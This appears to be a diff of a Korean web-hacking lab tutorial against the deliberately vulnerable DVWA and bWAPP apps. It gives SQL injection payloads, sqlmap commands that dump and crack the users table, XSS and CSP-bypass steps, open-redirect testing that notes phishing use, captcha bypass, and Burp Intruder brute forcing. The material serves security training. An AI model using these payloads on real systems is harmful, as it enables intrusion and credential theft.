+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># hash-identifier 도구로 해시 방식 판별
 sudo hash-identifier
 # 해시 값 입력 → Possible Hashes에서 MD5 방식 확인
-</code></pre></div>
+</code></pre></div></div>
 
 <p>hash-identifier 실행 시 Possible Hashes 항목에 아무것도 뜨지 않을 때가 있다. 이 경우 해당 도구로는 확인이 불가능한 것이므로, decode.fr 이나 사이버셰프(CyberChef)  등 다른 사이트를 이용해서 확인한다.</p>
 <p>John the Ripper로 패스워드를 크래킹한다.</p>
-<div class="codehilite"><pre><span></span><code># --format 옵션으로 MD5 방식 지정
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># --format 옵션으로 MD5 방식 지정
 sudo john --format=Raw-MD5 dvwa.txt
-</code></pre></div>
+</code></pre></div></div>
 
 <p>앞으로 파일을 만들어 크래킹할 때, MD5가 나왔다면 Raw-MD5 , Base64가 나왔다면 해당 방식을 --format  옵션에 지정하면 된다.</p>
 <p>크래킹 결과 예시:</p>
@@ -2273,14 +2297,14 @@ sudo john --format=Raw-MD5 dvwa.txt
 </tbody>
 </table></div>
 <p>Burp Suite에서도 동일하게 한 단계씩 또는 한꺼번에 포워딩할 수 있다.</p>
-<div class="codehilite"><pre><span></span><code># id 파라미터에 작은 따옴표 없이 OR 구문 삽입
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># id 파라미터에 작은 따옴표 없이 OR 구문 삽입
 id=5 OR &#39;1&#39;=&#39;1&#39; #
-</code></pre></div>
+</code></pre></div></div>
 
 <p>⚠️ Medium 레벨에서는 작은 따옴표를 삽입하면 Syntax error가 발생한다. 작은 따옴표를 제거한 상태로 진행해야 한다.</p>
-<div class="codehilite"><pre><span></span><code># 작은 따옴표 없이 참 조건 구성
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># 작은 따옴표 없이 참 조건 구성
 id=5 OR 1=1 #
-</code></pre></div>
+</code></pre></div></div>
 
 <p>포워드하면 전체 계정 정보가 출력된다.</p>
 <h5 id="5-4">5-4. 보안 대책의 한계</h5>
@@ -2294,8 +2318,8 @@ id=5 OR 1=1 #
 <h5 id="6-2_3">6-2. 취약점 확인</h5>
 <p>새 창에서 작은 따옴표를 입력하면 Syntax error가 아닌 "Something went wrong" 이라는 관리자가 임의로 설정한 메시지가 나온다. 정규 에러 표현을 보여주지 않아 취약점이 먹힐지 안 먹힐지 알 수 없도록 만들어 놓은 것이다.</p>
 <p>아래 구문을 입력하면 전체 계정 정보가 출력된다.</p>
-<div class="codehilite"><pre><span></span><code>5&#39; OR &#39;1&#39;=&#39;1&#39; #
-</code></pre></div>
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>5&#39; OR &#39;1&#39;=&#39;1&#39; #
+</code></pre></div></div>
 
 <h5 id="6-3_1">6-3. 코드 분석 결과</h5>
 <p>코드를 확인하면 LIMIT 1 이 추가된 것 외에는 Low 레벨과 동일하다. 창의 방식을 바꾸거나 입력 방식을 변경하더라도 근본적인 부분을 수정하지 않으면 취약점은 그대로 남아있다.</p>
@@ -2332,9 +2356,9 @@ id=5 OR 1=1 #
 <h5 id="7-2_1">7-2. 점검 결과</h5>
 <p>작은 따옴표, OR 구문, 주석 처리, AND 구문 등 다양한 조합을 입력해도 아무런 반응이 없다. 잘못된 쿼리 문을 전달해도 DB에서 반응하지 않는다.</p>
 <h5 id="7-3">7-3. 코드 분석</h5>
-<div class="codehilite"><pre><span></span><code>// id 파라미터가 정수 값인지 검증한 후 실행
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>// id 파라미터가 정수 값인지 검증한 후 실행
 is_numeric($id)
-</code></pre></div>
+</code></pre></div></div>
 
 <p>정수 값만 허용하므로 문자열 기반의 SQL 인젝션 시도가 차단된다.</p>
 <h4 id="8-sql-인젝션-수동-점검-절차-요약">8. SQL 인젝션 수동 점검 절차 요약</h4>
@@ -2391,7 +2415,7 @@ is_numeric($id)
 </table></div>
 <h4 id="3-sqlmap-기본-명령어-구조">3. sqlmap 기본 명령어 구조</h4>
 <p>Medium 레벨에서 sqlmap을 활용하는 예시다.</p>
-<div class="codehilite"><pre><span></span><code># 쿠키 값 지정 옵션: --cookie
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># 쿠키 값 지정 옵션: --cookie
 # URL 지정 옵션: -u
 # 전송 데이터 지정: --data
 # 점검할 파라미터 지정: -p
@@ -2400,17 +2424,17 @@ sudo sqlmap \
   -u &quot;&lt;http://대상IP/vulnerabilities/sqli/&gt;&quot; \
   --data &quot;id=1&amp;Submit=Submit&quot; \
   -p id
-</code></pre></div>
+</code></pre></div></div>
 
 <p>실행 중 yes/no 질문이 나오면 엔터로 진행한다.</p>
 <p>URL에 파라미터가 포함된 경우 큰따옴표로 URL 전체를 감싸서 지정한다.</p>
-<div class="codehilite"><pre><span></span><code># URL에 파라미터가 포함된 경우 예시
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># URL에 파라미터가 포함된 경우 예시
 sudo sqlmap \
   --cookie &quot;PHPSESSID=세션값; security=medium&quot; \
   -u &quot;&lt;http://대상IP/vulnerabilities/sqli/?id=1&amp;Submit=Subm
 it&gt;&quot; \
   -p id
-</code></pre></div>
+</code></pre></div></div>
 
 <h4 id="4-취약점-점검-결과-확인">4. 취약점 점검 결과 확인</h4>
 <p>점검 완료 후 화면 하단의 결과를 확인한다.</p>
@@ -2439,19 +2463,19 @@ it&gt;&quot; \
 <p>결과에서 유니온 쿼리를 이용했을 때 두 개의 칼럼이 있다는 것이 확인된다.</p>
 <h4 id="5-db-정보-추출">5. DB 정보 추출</h4>
 <h5 id="5-1_6">5-1. 데이터베이스 목록 확인</h5>
-<div class="codehilite"><pre><span></span><code># --dbs 옵션으로 DB 목록 조회
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># --dbs 옵션으로 DB 목록 조회
 sudo sqlmap \
   --cookie &quot;PHPSESSID=세션값; security=medium&quot; \
   -u &quot;&lt;http://대상IP/vulnerabilities/sqli/&gt;&quot; \
   --data &quot;id=1&amp;Submit=Submit&quot; \
   -p id \
   --dbs
-</code></pre></div>
+</code></pre></div></div>
 
 <p>결과 예시: dvwa , information_schema , mysql , test</p>
 <p>test  DB가 존재하는 경우 MySQL 보안 설치(mysql_secure_installation)에서 삭제 작업이 완료되지 않은 것이다.</p>
 <h5 id="5-2_4">5-2. 테이블 목록 확인</h5>
-<div class="codehilite"><pre><span></span><code># -D [DB명] --tables 옵션으로 테이블 목록 조회
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># -D [DB명] --tables 옵션으로 테이블 목록 조회
 sudo sqlmap \
   --cookie &quot;PHPSESSID=세션값; security=medium&quot; \
   -u &quot;&lt;http://대상IP/vulnerabilities/sqli/&gt;&quot; \
@@ -2459,11 +2483,11 @@ sudo sqlmap \
   -p id \
   -D dvwa \
   --tables
-</code></pre></div>
+</code></pre></div></div>
 
 <p>결과: guestbook , users</p>
 <h5 id="5-3_1">5-3. 칼럼 목록 확인</h5>
-<div class="codehilite"><pre><span></span><code># -D [DB명] -T [테이블명] --columns 옵션
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># -D [DB명] -T [테이블명] --columns 옵션
 sudo sqlmap \
   --cookie &quot;PHPSESSID=세션값; security=medium&quot; \
   -u &quot;&lt;http://대상IP/vulnerabilities/sqli/&gt;&quot; \
@@ -2472,10 +2496,10 @@ sudo sqlmap \
   -D dvwa \
   -T users \
   --columns
-</code></pre></div>
+</code></pre></div></div>
 
 <h5 id="5-4_1">5-4. 데이터 덤프 (계정 정보 추출)</h5>
-<div class="codehilite"><pre><span></span><code># --dump 옵션으로 테이블 내용 전체 조회
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># --dump 옵션으로 테이블 내용 전체 조회
 sudo sqlmap \
   --cookie &quot;PHPSESSID=세션값; security=medium&quot; \
   -u &quot;&lt;http://대상IP/vulnerabilities/sqli/&gt;&quot; \
@@ -2484,15 +2508,15 @@ sudo sqlmap \
   -D dvwa \
   -T users \
   --dump
-</code></pre></div>
+</code></pre></div></div>
 
 <p>sqlmap이 해시된 패스워드를 자동으로 크래킹하여 원래 패스워드와 함께 출력한다. 별도로 패스워드를 크래킹하는 과정 없이 결과가 바로 나온다.</p>
 <h5 id="5-5">5-5. 결과 파일 확인</h5>
 <p>sqlmap은 결과를 자동으로 CSV 파일로 저장한다. 화면 하단에서 저장 경로를 확인할 수 있다.</p>
-<div class="codehilite"><pre><span></span><code># 저장된 CSV 파일 확인
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># 저장된 CSV 파일 확인
 sudo cat /root/.local/share/sqlmap/output/[대상IP]/dump/dvw
 a/users.csv
-</code></pre></div>
+</code></pre></div></div>
 
 <h4 id="6-sql-injection-blind">6. SQL Injection Blind</h4>
 <h5 id="6-1-blind">6-1. Blind 인젝션의 특징</h5>
@@ -2534,34 +2558,34 @@ a/users.csv
 </table></div>
 <p>DB 이름 하나를 알아내기 위해서도 매우 많은 쿼리 문을 사용해야 한다. 이러한 이유로 Blind 인젝션의 수동 점검은 직접 사용하기 어렵고, 파이썬 등의 프로그래밍 언어로 자동화 코드를 작성하거나 sqlmap을 활용하는 것이 일반적이다.</p>
 <p>수동 점검 시 삽입하는 구문 예시 (채팅창 제공 예시):</p>
-<div class="codehilite"><pre><span></span><code>-- information_schema.columns에서 DISTINCT로 중복 제거하여 조회
+<div class="code-shell" data-language="SQL"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">SQL</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>-- information_schema.columns에서 DISTINCT로 중복 제거하여 조회
 -- SUBSTR 함수로 첫 번째 자리 문자가 &#39;a&#39;인지 확인
 1&#39; AND SUBSTR(SELECT DISTINCT(table_schema) FROM informatio
 n_schema.columns,1,1)=&#39;a&#39; #
-</code></pre></div>
+</code></pre></div></div>
 
 <p>DISTINCT : 조회 결과에서 중복 값을 제거</p>
 <p>SUBSTR : 문자열에서 특정 위치의 문자를 추출</p>
 <p>⚠️ 이러한 방식으로 DB 이름, 테이블 이름, 칼럼 이름을 모두 한 글자씩 찾아야 한다. 경우의 수가 매우 많아 수동으로는 사실상 힘들다.</p>
 <h5 id="6-3-sqlmap-blind">6-3. sqlmap으로 Blind 점검</h5>
 <p>SQL Injection Blind 페이지에서도 sqlmap을 동일하게 활용할 수 있다.</p>
-<div class="codehilite"><pre><span></span><code># sqli_blind 경로로 변경하여 점검
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># sqli_blind 경로로 변경하여 점검
 sudo sqlmap \
   --cookie &quot;PHPSESSID=세션값; security=low&quot; \
   -u &quot;&lt;http://대상IP/vulnerabilities/sqli_blind/&gt;&quot; \
   --data &quot;id=1&amp;Submit=Submit&quot; \
   -p id
-</code></pre></div>
+</code></pre></div></div>
 
 <p>점검 결과 예시: boolean-based blind , time-based blind  방식으로 취약점 확인.</p>
-<div class="codehilite"><pre><span></span><code># 취약점 확인 후 DB 목록 조회 동일하게 진행
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># 취약점 확인 후 DB 목록 조회 동일하게 진행
 sudo sqlmap \
   --cookie &quot;PHPSESSID=세션값; security=low&quot; \
   -u &quot;&lt;http://대상IP/vulnerabilities/sqli_blind/&gt;&quot; \
   --data &quot;id=1&amp;Submit=Submit&quot; \
   -p id \
   --dbs
-</code></pre></div>
+</code></pre></div></div>
 
 <p>이후 테이블 목록, 칼럼 목록, 덤프 작업은 앞서 설명한 일반 SQL Injection과 동일한 방식으로 진행한다.</p>
 <h4 id="7-수동-점검과-자동화-도구-비교">7. 수동 점검과 자동화 도구 비교</h4>
@@ -2581,18 +2605,18 @@ sudo sqlmap \
 <p>검색 결과: 세계시간 변환기, 시차계산기, 시간대 변환기 등이 나온다.</p>
 <p>이를 통해 이 쿠키 값이 현재 세션의 시간대(타임스탬프)를 값으로 변환한 것임을 알 수 있다. 즉, Generate 버튼을 누를 때의 시간 값이 그대로 코드화되어 쿠키에 들어간다.</p>
 <p>코드를 확인하면 time()  함수를 사용하여 세션 값을 생성하고 있다.</p>
-<div class="codehilite"><pre><span></span><code>// time() 함수: 현재 시간을 Unix 타임스탬프로 반환
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>// time() 함수: 현재 시간을 Unix 타임스탬프로 반환
 time()
-</code></pre></div>
+</code></pre></div></div>
 
 <p>Generate 버튼을 누르는 순간의 시간을 기록하고 시간 변환기에 입력하면 동일한 값이 나온다. 즉, 버튼을 누른 시각으로 쿠키 값의 역추적이 가능하다.</p>
 <h5 id="1-4-high">1-4. High 레벨</h5>
 <p>두 개의 쿠키가 생성된다. 위쪽 쿠키는 고정되어 있고, dvwaSession  값은 Generate를 클릭할 때마다 변경된다. Low·Medium 레벨보다 예측이 어렵지만, 여러 번의 값을 수집하여 변화 규칙을 분석하면 패턴 파악이 가능하다. 코드에서 해시값을 적용하여 생성하는 것을 확인할 수 있다.</p>
 <h5 id="1-5-impossible">1-5. Impossible 레벨</h5>
 <p>Generate를 여러 번 클릭해도 쿠키 값에 변화가 보이지 않는다. 겉으로는 값이 바뀌지 않는 것처럼 보이지만, 코드를 확인하면 아래와 같이 구현되어 있다.</p>
-<div class="codehilite"><pre><span></span><code>// 20바이트의 랜덤한 바이트 생성 후 hex로 변환
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>// 20바이트의 랜덤한 바이트 생성 후 hex로 변환
 bin2hex(random_bytes(20))
-</code></pre></div>
+</code></pre></div></div>
 
 <div class="tablewrap"><table>
 <thead>
@@ -2622,14 +2646,14 @@ bin2hex(random_bytes(20))
 <p>DOM(Document Object Model)은 웹브라우저가 HTML이나 XML 문서를 인식하고 처리하는 방식을 정의하는 객체 모델이다. DOM을 사용하면 자바스크립트 같은 스크립트가 삽입되었을 때 동적으로 페이지를 수정하거나 삭제하거나 생성하는 것이 가능해진다.</p>
 <h5 id="2-2-low">2-2. Low 레벨 동작 확인</h5>
 <p>언어 목록에서 항목을 선택하면 URL의 default  파라미터에 선택한 언어가 전달된다.</p>
-<div class="codehilite"><pre><span></span><code>&lt;http://대상IP/vulnerabilities/xss_d/?default=English&gt;
-</code></pre></div>
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>&lt;http://대상IP/vulnerabilities/xss_d/?default=English&gt;
+</code></pre></div></div>
 
 <p>목록에 없는 값을 직접 입력하면(예: Korean ) URL의 default  파라미터에 그 값이 들어가며 동적으로 처리된다.</p>
 <h5 id="2-3_3">2-3. 스크립트 삽입</h5>
 <p>default  파라미터에 스크립트 태그를 삽입하면 실행된다.</p>
-<div class="codehilite"><pre><span></span><code>&lt;script&gt;alert(1)&lt;/script&gt;
-</code></pre></div>
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre></div></div>
 
 <p>스크립트가 실행되어 알림창이 뜨고, 현재 선택된 언어 표시 부분에 아무것도 나타나지 않는다. 일반 문자열이 아닌 스크립트로 인식되어 실행된 것이다.</p>
 <h5 id="2-4-dom-xss">2-4. DOM XSS의 특징</h5>
@@ -2641,9 +2665,9 @@ bin2hex(random_bytes(20))
 <h5 id="3-2-low">3-2. Low 레벨 동작 확인</h5>
 <p>이 페이지는 외부 소스(URL)를 입력하면 해당 스크립트를 실행하는 기능을 제공한다. 개발자가 화이트리스트를 만들어 허용된 URL들을 지정해두고, 해당 URL에서만 스크립트를 로드할 수 있도록 설정한 구조다.</p>
 <p>코드를 확인하면 허용된 도메인 주소 목록이 변수에 들어가 있으며, 입력된 주소가 그대로 스크립트 src  속성에 삽입되어 실행되는 구조다.</p>
-<div class="codehilite"><pre><span></span><code>&lt;!-- src에 입력된 URL이 삽입되어 실행 --&gt;
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>&lt;!-- src에 입력된 URL이 삽입되어 실행 --&gt;
 &lt;script src=&quot;[입력된 URL]&quot;&gt;&lt;/script&gt;
-</code></pre></div>
+</code></pre></div></div>
 
 <h5 id="3-3_5">3-3. 우회 방법</h5>
 <p>Pastebin.com처럼 허용된 도메인에 스크립트 코드를 올린 후, 해당 URL을 입력란에 넣고 Include(인클로드)를 클릭하면 CSP 정책을 우회하여 스크립트가 실행될 수 있다.</p>
@@ -2696,9 +2720,9 @@ bin2hex(random_bytes(20))
 <p>Console 탭에서 아래 명령을 입력하고 실행한다.</p>
 </li>
 </ol>
-<div class="codehilite"><pre><span></span><code>// 폼의 id 값이 &quot;phrase&quot;인 경우, 세미콜론으로 마무리
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>// 폼의 id 값이 &quot;phrase&quot;인 경우, 세미콜론으로 마무리
 document.getElementById(&quot;phrase&quot;).value = &quot;success&quot;;
-</code></pre></div>
+</code></pre></div></div>
 
 <p>이 방법은 현재 페이지에 이미 존재하는 사용자 토큰을 그대로 활용하므로, 토큰이 맞지 않는다는 오류 없이 "success"가 입력된 상태로 폼이 제출된다. 결과적으로 Change.me 가 아닌 "success" 상태로 우회에 성공한다.</p>
 <p>콘솔에서 폼에 직접 값을 넣는 방법은 현재 페이지의 유저 토큰을 그대로 사용하기 때문에 토큰 검증을 우회할 수 있다.</p>
@@ -2773,23 +2797,23 @@ document.getElementById(&quot;phrase&quot;).value = &quot;success&quot;;
 <p>코드를 확인하면 redirect  파라미터가 존재하는지 확인하고, 해당 값을 가져와 Location 으로 이동시키는 로직이 있다.</p>
 <h5 id="2-3-low">2-3. Low 레벨 — 파라미터 위치 탐색</h5>
 <p>redirect  파라미터를 어느 위치에 붙여야 하는지 테스트한다.</p>
-<div class="codehilite"><pre><span></span><code># 방법 1: 페이지 경로 뒤에 직접 붙이기 (redirect 파라미터 임의 추가)
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># 방법 1: 페이지 경로 뒤에 직접 붙이기 (redirect 파라미터 임의 추가)
 &lt;http://대상IP/vulnerabilities/redirects/?redirect=http://연결할사이트&gt;
 # 방법 2: info.php 뒤에 redirect 파라미터 추가
 &lt;http://대상IP/vulnerabilities/redirects/info.php?redirect=http://연결할사이트&gt;
-</code></pre></div>
+</code></pre></div></div>
 
 <p>방법 2로 입력했을 때 Quart ID missing 처럼 다른 오류가 뜬다면 id  파라미터가 없어서 발생하는 것이며, redirect 파라미터 자체는 인식되고 있는 것이다.</p>
 <p>파라미터가 올바른 위치에 있는 것이 확인되면, redirect  값으로 원하는 사이트를 입력했을 때 해당 사이트로 리디렉트가 일어나야 한다.</p>
 <h5 id="2-4-low">2-4. Low 레벨 — 칼리 웹서버로 리디렉트 테스트</h5>
 <p>칼리 터미널에서 파이썬으로 간단한 웹서버를 실행한다.</p>
-<div class="codehilite"><pre><span></span><code># 파이썬으로 8000번 포트에 웹서버 실행
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># 파이썬으로 8000번 포트에 웹서버 실행
 python3 -m http.server 8000
-</code></pre></div>
+</code></pre></div></div>
 
 <p>redirect  파라미터에 칼리 IP와 포트를 입력하여 리디렉트가 되는지 테스트한다.</p>
-<div class="codehilite"><pre><span></span><code>&lt;http://대상IP/vulnerabilities/redirects/?redirect=http://칼리IP:8000&gt;
-</code></pre></div>
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>&lt;http://대상IP/vulnerabilities/redirects/?redirect=http://칼리IP:8000&gt;
+</code></pre></div></div>
 
 <p>테스트 결과, 구글 닷컴이나 칼리 웹서버로의 접속이 안 되는 경우도 있다. view 소스로 코드를 확인하면 redirect  파라미터가 올바르게 인식되고 있는지 점검할 수 있다.</p>
 <p>redirect  파라미터에 대한 검증이 없기 때문에, 공격자가 원하는 파라미터를 통해 원하는 사이트로 연결할 수 있다는 것이 핵심이다. 실제 환경에서는 피싱 사이트를 여기에 연결 하면 된다.</p>
@@ -2806,10 +2830,10 @@ python3 -m http.server 8000
 <h5 id="3-2-low_1">3-2. Low 레벨</h5>
 <p>입력란에 값(예: happy )을 입력하고 Submit하면 인코드된 값이 출력된다. 해당 값을 복사하여 메시지 입력란에 붙여넣고 Decode 후 Submit하면 원래 값이 나온다.</p>
 <p>약 32자리의 16진수로 이루어진 값은 대부분 MD5 방식이다.</p>
-<div class="codehilite"><pre><span></span><code># 터미널에서 해시 방식 확인
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># 터미널에서 해시 방식 확인
 sudo hash-identifier
 # 해시 값 입력
-</code></pre></div>
+</code></pre></div></div>
 
 <p>확인 방법:</p>
 <div class="tablewrap"><table>
@@ -2959,11 +2983,11 @@ sudo hash-identifier
 <p>캡차 값은 변경하지 않고 Forward</p>
 </li>
 </ol>
-<div class="codehilite"><pre><span></span><code># 버프 인터셉트 후 파라미터 변조 예시
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># 버프 인터셉트 후 파라미터 변조 예시
 login=b&amp;password=bug&amp;captcha=[정확한캡차값]
 ↓ 변조
 login=테스트계정&amp;password=1234&amp;captcha=[동일한캡차값]
-</code></pre></div>
+</code></pre></div></div>
 
 <p>원래 캡차는 사용자가 로봇인지 사람인지 구분하기 위한 수단인데, 1차 아이디/패스워드 인증 이후에 캡차 인증이 들어가는 구조에서 캡차를 고정하고 1차 인증 정보를 변조하면 다른 계정으로 접속이 가능하다.</p>
 <h4 id="3-forgotten-function-비밀번호-찾기-취약점">3. Forgotten Function (비밀번호 찾기 취약점)</h4>
@@ -2972,9 +2996,9 @@ login=테스트계정&amp;password=1234&amp;captcha=[동일한캡차값]
 <p>관리자 이메일은 웹페이지 하단에 노출되는 경우가 많음</p>
 <p>노출된 이메일로 비밀번호 찾기를 시도하면 힌트가 노출됨</p>
 <h5 id="3-2_10">3-2. 실습 방법</h5>
-<div class="codehilite"><pre><span></span><code># 이메일 입력 후 Forgot 버튼 클릭
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># 이메일 입력 후 Forgot 버튼 클릭
 test@test.com → 입력 → Forgot 클릭
-</code></pre></div>
+</code></pre></div></div>
 
 <p>시크릿 메시지(비밀번호 힌트)가 화면에 출력됨을 확인</p>
 <h4 id="4-insecure-login-form-취약한-로그인-폼">4. Insecure Login Form (취약한 로그인 폼)</h4>
@@ -3019,49 +3043,49 @@ test@test.com → 입력 → Forgot 클릭
 <p>로그아웃 후 다른 사람이 뒤로 가기를 누르면 로그인된 상태로 개인정보가 노출될 수 있다. 아직도 세션 종료 처리가 미비한 사이트들이 존재한다.</p>
 <h4 id="6-password-attacks-패스워드-공격">6. Password Attacks (패스워드 공격)</h4>
 <h5 id="6-1-intruder">6-1. 버프 스위트 Intruder를 이용한 패스워드 크래킹</h5>
-<div class="codehilite"><pre><span></span><code># 공격 절차
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># 공격 절차
 1. 버프 스위트 인터셉트 ON
 2. 로그인 버튼 클릭하여 패킷 인터셉트
 3. 우클릭 → Send to Intruder
 4. Intruder 탭에서 패스워드 파라미터 선택 → Add Payload
 5. Payloads 탭에서 단어 목록 추가 (직접 입력 또는 파일 로드)
 6. Start Attack
-</code></pre></div>
+</code></pre></div></div>
 
 <p>패스워드 목록 예시</p>
-<div class="codehilite"><pre><span></span><code>1234
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>1234
 test
 bug
 4321
-</code></pre></div>
+</code></pre></div></div>
 
 <p>공격 결과에서 응답 길이(Length)가 다른 항목이 올바른 패스워드</p>
 <h5 id="6-2-cluster-bomb">6-2. 두 개 이상 파라미터 대입 (Cluster Bomb)</h5>
 <p>아이디와 패스워드 모두 모르는 경우 Cluster Bomb 방식을 사용한다.</p>
-<div class="codehilite"><pre><span></span><code># Intruder 어태크 타입: Cluster Bomb 선택
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># Intruder 어태크 타입: Cluster Bomb 선택
 # 페이로드 포지션: 아이디(§b§), 패스워드(§bug§) 두 곳 설정
 # Payload 1: user.txt 파일 로드
 # Payload 2: pass.txt 파일 로드
-</code></pre></div>
+</code></pre></div></div>
 
 <p>사전 파일 생성 예시</p>
-<div class="codehilite"><pre><span></span><code># 칼리에서 user.txt 파일 생성/수정
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># 칼리에서 user.txt 파일 생성/수정
 vi user.txt
 # 내용 추가: b, bee, test 등
 # pass.txt 파일 생성/수정
 vi pass.txt
 # 내용 추가: 1234, bug, test 등
-</code></pre></div>
+</code></pre></div></div>
 
 <p>패스워드가 소문자 영어 세 글자로만 이루어져 있다면 A에서 Z까지의 경우의 수가 크지 않아 수동으로도 대입 가능하다. 현재는 최소 10글자 이상, 영어 대문자·소문자·특수문자· 숫자를 조합하여 패스워드를 만들도록 권장한다.</p>
 <h4 id="7-administrative-portal-관리자-포털-세션-취약점">7. Administrative Portal (관리자 포털 세션 취약점)</h4>
 <h5 id="7-1-low-url">7-1. Low 레벨 — URL 파라미터 조작</h5>
 <p>관리자 포털 페이지의 URL에 admin  파라미터가 포함되어 있다.</p>
-<div class="codehilite"><pre><span></span><code># Low 레벨 URL 예시
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># Low 레벨 URL 예시
 http://[beeboxIP]/bwapp/ba_insecure_login.php?admin=0
 # admin 파라미터를 1로 변경
 http://[beeboxIP]/bwapp/ba_insecure_login.php?admin=1
-</code></pre></div>
+</code></pre></div></div>
 
 <p>admin=0 : 잠김 상태</p>
 <p>admin=1 : 잠금 해제 (관리자 포털 접근 가능)</p>
@@ -3069,14 +3093,14 @@ http://[beeboxIP]/bwapp/ba_insecure_login.php?admin=1
 <h5 id="7-2-medium">7-2. Medium 레벨 — 쿠키 값 조작</h5>
 <p>Medium 레벨에서는 URL 파라미터가 아닌 쿠키 값으로 관리자 권한을 확인한다.</p>
 <p>개발자 도구로 쿠키 확인 방법</p>
